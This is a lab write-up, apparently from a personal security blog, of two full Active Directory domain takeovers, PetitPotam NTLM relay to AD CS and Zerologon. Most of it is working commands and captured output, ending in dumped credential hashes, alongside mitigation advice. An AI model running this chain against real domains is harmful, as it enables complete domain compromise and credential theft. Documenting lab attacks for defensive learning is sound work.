---
title: "Active Directory Domain Attacks: PetitPotam / AD CS and Zerologon"
description: "A hands-on Active Directory lab covering PetitPotam-assisted NTLM relay to AD CS and Zerologon, with the commands, outputs, gotchas and recovery steps I used."
category: infrastructure
order: 50
status: published
topics:
  - Active Directory
  - AD CS
  - NTLM Relay
  - Kerberos
  - PetitPotam
  - Zerologon
relatedResearch: []
relatedArticles: []
---
## Introduction

Getting Domain Admin is still one of those moments that makes an Active Directory lab interesting.

For this setup I wanted to play with two very different routes to a full domain takeover:

- **PetitPotam + NTLM relay to AD CS**
- **Zerologon**

The lab is intentionally old and unpatched. That is the point: I want to see the complete attack chain and understand what each step gives me.

My setup:

```text
Domain             : victim.com

Domain Controller
Hostname           : advictim2012r2
FQDN               : advictim2012r2.victim.com
IP                 : 192.168.201.9

AD CS Server
Hostname           : cavictim2012r2
FQDN               : cavictim2012r2.victim.com
IP                 : 192.168.100.10

Operating System   : Windows Server 2012 R2 evaluation
Attacker system    : Kali Linux
```

These commands were captured in this lab with the tool versions shown in the output. Current releases may use slightly different paths or switches, so check the tool help when reproducing it.

![PetitPotam and AD CS lab](/images/knowledge-base/active-directory-attack-techniques/petitpotam.png)

## Part 1 — PetitPotam + AD CS

### What are we trying to do?

The chain is easier to understand when you write it down:

```text
force the Domain Controller to authenticate
        ↓
relay that NTLM authentication to AD CS web enrollment
        ↓
request a certificate as the DC machine account
        ↓
use that certificate for Kerberos authentication
        ↓
recover the DC machine-account NT hash
        ↓
request privileged tickets
        ↓
dump domain secrets
```

PetitPotam is the first push. The real power comes from successfully relaying the machine authentication to the Certificate Authority.

### Tools

For this lab I used:

- Python virtual environment;
- Impacket / `ntlmrelayx`;
- PetitPotam;
- PKINITtools.

I kept the Python tools in a virtual environment:

```shell
apt install python3-venv
mkdir pyvirtenv
python3 -m venv pyvirtenv
source pyvirtenv/bin/activate
```

For the Impacket branch I was using at the time:

```shell
cd pyvirtenv
git clone https://github.com/ExAndroidDev/impacket.git
cd impacket
git checkout ntlmrelayx-adcs-attack
python3 setup.py install
```

PetitPotam:

```shell
cd ~/pyvirtenv
git clone https://github.com/topotam/PetitPotam
cd PetitPotam
pip3 install -r requirements.txt
```

PKINITtools:

```shell
cd ~/pyvirtenv
git clone https://github.com/dirkjanm/PKINITtools
cd PKINITtools
pip3 install -r requirements.txt
```

### Make sure DNS works first

Kerberos and certificates care about names, so I made sure the Kali box could resolve the domain controller and CA.

In this lab `/etc/resolv.conf` pointed to the DNS service on the DC:

```text
nameserver 192.168.201.9
```

Do this check before spending time debugging PKINIT.

### Start the NTLM relay

I pointed `ntlmrelayx` at the AD CS web enrollment endpoint:

```shell
python3 impacket/examples/ntlmrelayx.py \
  -debug \
  -smb2support \
  --target http://cavictim2012r2.victim.com/certsrv/certrqus.asp \
  --template DomainController \
  --adcs
```

The important part of the output is that the relay services start and wait:

```text
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server
[*] Servers started, waiting for connections
```

### Coerce the Domain Controller with PetitPotam

In a second terminal:

```shell
python3 PetitPotam/PetitPotam.py 192.168.201.20 192.168.201.9
```

And this is the bit I wanted to see:

```text
Trying pipe lsarpc
[-] Connecting to ncacn_np:192.168.201.9[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

Back in `ntlmrelayx` the DC machine account authenticated to the relay and the request to AD CS succeeded:

```text
[*] Authenticating against http://cavictim2012r2.victim.com as VICTIM/ADVICTIM2012R2$ SUCCEED
[*] HTTP server returned error code 200, treating as a successful login
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user ADVICTIM2012R2$:
...
```

We now have a certificate for the Domain Controller machine account.

### Decode the PFX

I saved the Base64 certificate as `crt.pfx.b64` and decoded it:

```shell
cat crt.pfx.b64 | base64 -d > crt.pfx
```

### Request a Kerberos TGT with the certificate

Next I used `gettgtpkinit.py`:

```shell
python3 PKINITtools/gettgtpkinit.py \
  -cert-pfx crt.pfx \
  victim.com/ADVICTIM2012R2\$ \
  out.ccache
```

My output contained:

```text
INFO:minikerberos:Loading certificate and key from file
INFO:minikerberos:Requesting TGT
INFO:minikerberos:AS-REP encryption key (you might need this later):
fac3a7b493bd2d3a32c7fb959345c11e712ef96db0e46205150cdd57938490ef
INFO:minikerberos:Saved TGT to file
```

Keep both:

- `out.ccache`
- the AS-REP encryption key

We need them in the next step.

### Two PKINIT errors worth remembering

I hit these while building the lab.

#### `KDC_ERR_CLIENT_NOT_TRUSTED`

```text
KDC_ERR_CLIENT_NOT_TRUSTED
"The client trust failed or is not implemented"
```

In my case the root certificate was not properly propagated to the Domain Controller.

#### `KDC_ERR_PADATA_TYPE_NOSUPP`

```text
KDC_ERR_PADATA_TYPE_NOSUPP
"KDC has no support for PADATA type"
```

I ran into this while experimenting with Windows Server 2008 R2 and smart-card logon / PKINIT support.

These errors appear **after** the relay stage, so do not immediately blame PetitPotam or `ntlmrelayx`.

### Recover the DC machine-account NT hash

Now use the ticket cache and AS-REP key:

```shell
KRB5CCNAME=out.ccache \
python3 PKINITtools/getnthash.py \
  victim.com/ADVICTIM2012R2\$ \
  -key fac3a7b493bd2d3a32c7fb959345c11e712ef96db0e46205150cdd57938490ef
```

Result:

```text
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
6584bf06e7b65c680426dd1b21352f01
```

At this point the attack has moved a long way from “I can coerce authentication.” We now hold authentication material for the DC machine account.

### Pick an administrative account

I used CrackMapExec to list interesting accounts:

```shell
crackmapexec ldap advictim2012r2.victim.com \
  -u ADVICTIM2012R2\$ \
  -H 6584bf06e7b65c680426dd1b21352f01 \
  --admin-count
```

Among the output:

```text
LDAP  advictim2012r2.victim.com 389  ADVICTIM2012R2  Administrator
LDAP  advictim2012r2.victim.com 389  ADVICTIM2012R2  krbtgt
LDAP  advictim2012r2.victim.com 389  ADVICTIM2012R2  Domain Admins
LDAP  advictim2012r2.victim.com 389  ADVICTIM2012R2  Enterprise Admins
```

For the next step I used `Administrator`.

### Request the service ticket

```shell
KRB5CCNAME=out.ccache \
python3 PKINITtools/gets4uticket.py \
  kerberos+ccache://victim.com\\ADVICTIM2012R2\$:out.ccache@ADVICTIM2012R2.victim.com \
  cifs/ADVICTIM2012R2.victim.com@victim.com \
  Administrator@victim.com \
  Administrator.ccache \
  -v
```

And:

```text
INFO:minikerberos:Trying to get SPN with Administrator@victim.com for cifs/ADVICTIM2012R2.victim.com@victim.com
INFO:minikerberos:Success!
INFO:minikerberos:Done!
```

### Dump the directory secrets

With the Administrator ticket cache:

```shell
KRB5CCNAME=Administrator.ccache \
python3 impacket/examples/secretsdump.py \
  -just-dc-ntlm \
  -user-status \
  -debug \
  -k victim.com/Administrator@ADVICTIM2012R2.victim.com \
  -no-pass \
  -outputfile victim.com
```

A small part of the lab output:

```text
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:...:41b3f9ac5278dae30d67b59e3b01383f::: (status=Enabled)
krbtgt:502:...:4e10b53bcd24af9db5f2f9cb302d3a94::: (status=Disabled)
ADVICTIM2012R2$:1000:...:6584bf06e7b65c680426dd1b21352f01::: (status=Enabled)
```

At that point the lab domain is effectively owned.

### What I would fix

The main controls I care about for this chain are:

- LDAP signing and channel binding where applicable;
- Extended Protection for Authentication (EPA) on AD CS web enrollment;
- EPA on Certificate Enrollment Web Service;
- reducing NTLM where the environment allows it;
- blocking relayable AD CS enrollment paths.

Microsoft KB5005413 is a good reference for the AD CS relay side.

---

## Part 2 — Zerologon

PetitPotam / AD CS is a multi-step relay chain. Zerologon is a completely different beast.

The vulnerability sits in Netlogon authentication. The vulnerable implementation used AES-CFB8 with a fixed all-zero IV. Combined with acceptance of insecure Netlogon sessions, repeated all-zero authentication attempts could eventually succeed.

The rough flow is:

```text
authenticate as the DC machine account
        ↓
set the DC machine-account password to empty
        ↓
use that state to dump domain secrets
        ↓
recover the real machine-account secret
        ↓
restore it immediately
```

The last step is not housekeeping. It is part of the exploit procedure.

## Check the DC with Metasploit

I used the Zerologon auxiliary module:

```text
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > options

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   NBNAME  advictim2012r2   yes       The server's NetBIOS name
   RHOSTS  192.168.201.9    yes       The target host
```

Then:

```text
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > check

[*] 192.168.201.9: - Connecting to the endpoint mapper service...
[+] 192.168.201.9 - The target is vulnerable.
```

That is the safe moment to stop if the assessment does not authorize disruptive exploitation.

## Important: this changes Domain Controller state

The exploitation action sets the DC machine-account password to an empty value.

That creates an inconsistency between:

- the password in Active Directory;
- the password stored locally by the Domain Controller.

Replication and other domain functions can break.

So before I run this part I make sure I am in a lab, I know how to recover the current machine password, and I am ready to restore it immediately.

## Set the machine-account password to empty

```text
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > exploit

[*] Running module against 192.168.201.9
[+] 192.168.201.9:49155 - Successfully authenticated
[+] 192.168.201.9:49155 - Successfully set the machine account (advictim2012r2$) password to empty
[*] Auxiliary module execution completed
```

## Dump the domain credentials

Now the DC account can be used without a password:

```shell
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
  'ADVICTIM2012R2$'@192.168.201.9 \
  -no-pass \
  -outputfile victim.com \
  -user-status
```

The lab output included:

```text
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:...:41b3f9ac5278dae30d67b59e3b01383f::: (status=Enabled)
krbtgt:502:...:4e10b53bcd24af9db5f2f9cb302d3a94::: (status=Disabled)
ADVICTIM2012R2$:1000:...:31d6cfe0d16ae931b73c59d7e0c089c0::: (status=Enabled)
```

## Recover the real machine-account password

Before restoring the account I need the current machine-account secret from the Domain Controller.

Using an administrative hash from the lab:

```shell
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
  administrator@192.168.201.9 \
  -hashes aad3b435b51404eeaad3b435b51404ee:41b3f9ac5278dae30d67b59e3b01383f \
  -outputfile victim.com \
  -user-status
```

The important entry is:

```text
VICTIM\ADVICTIM2012R2$:plain_password_hex:cfbb2bbc9b3a70e340d0026b250a2d3c9ea12f2e79a65c30e0ac776a3a412c38
```

That hex value is what I use to restore the DC machine account.

## Restore the machine account

Back in Metasploit:

```text
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set action RESTORE
action => RESTORE

msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set PASSWORD cfbb2bbc9b3a70e340d0026b250a2d3c9ea12f2e79a65c30e0ac776a3a412c38

msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > exploit

[+] 192.168.201.9:49155 - Successfully set machine account (advictim2012r2$) password
[*] Auxiliary module execution completed
```

Job done: exploit validated, secrets demonstrated in the isolated lab, and the machine account is back where it belongs.

## What this lab taught me

These two attacks look very different, but I use the same habit for both: write down what I gain after each step.

For PetitPotam / AD CS:

```text
coerced auth
  → relayed machine identity
  → certificate
  → Kerberos ticket
  → machine hash
  → privileged ticket
  → directory secrets
```

For Zerologon:

```text
Netlogon bypass
  → DC machine identity
  → temporary password change
  → directory secrets
  → recover machine secret
  → restore
```

That makes long attack chains much easier to debug. When something fails, I know exactly which step I am missing.

## References

- [Microsoft KB5005413 — Mitigating NTLM Relay Attacks on Active Directory Certificate Services (AD CS)](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)
- [Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
